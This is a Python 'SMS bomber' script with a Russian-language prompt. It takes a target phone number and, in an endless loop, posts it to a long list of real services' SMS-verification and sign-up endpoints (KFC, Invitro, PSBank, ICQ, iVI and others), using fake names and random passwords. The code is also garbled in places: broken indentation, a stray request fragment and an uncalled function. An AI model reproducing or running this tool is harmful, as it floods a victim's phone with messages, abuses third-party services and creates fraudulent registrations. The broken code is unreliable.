import threading
import time
import requests, random, datetime, sys, time, argparse, os
print (""""
███╗░░░███╗███████╗████████╗██████╗░░█████╗░
████╗░████║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗
██╔████╔██║█████╗░░░░░██║░░░██████╔╝██║░░██║
██║╚██╔╝██║██╔══╝░░░░░██║░░░██╔══██╗██║░░██║
██║░╚═╝░██║███████╗░░░██║░░░██║░░██║╚█████╔╝
╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░"""")

phone = input("\033[32m Введите номер +")

def qw(_phone):
    if _phone[0] == '+':
        _phone = _phone[1:]
    if _phone[0] == '8':
        _phone = '7'+_phone[1:]
    if _phone[0] == '9':
        _phone = '7'+_phone
_phone = phone
    _name = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

    _phone9 = _phone[1:]
    _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
    _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
    _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
    _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
    _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
    s = 0
    iteration = 0
    while True:
        _email = _name+f'{iteration}'+'@gmail.com'
        email = _name+f'{iteration}'+'@gmail.com'
        
        54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
        except:
            s=s

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
        except:
            s=s

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
        except:
            s=s

        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
        except:
            s=s

        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
        except:
            s=s

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
        except:
            s=s

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
        except:
            s=s

        try:
            requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
        except:
            s=s

        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
        except:
            s=s

        try:
            requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
        except:
            s=s

        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
        except:
            s=s

        try:
            requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
        except:
            s=s

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
        except:
            s=s

        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
        except:
            s=s

        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
        except:
            s=s

        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
        except:
            s=s

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})

        except:
            s=s

        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
        except:
            s=s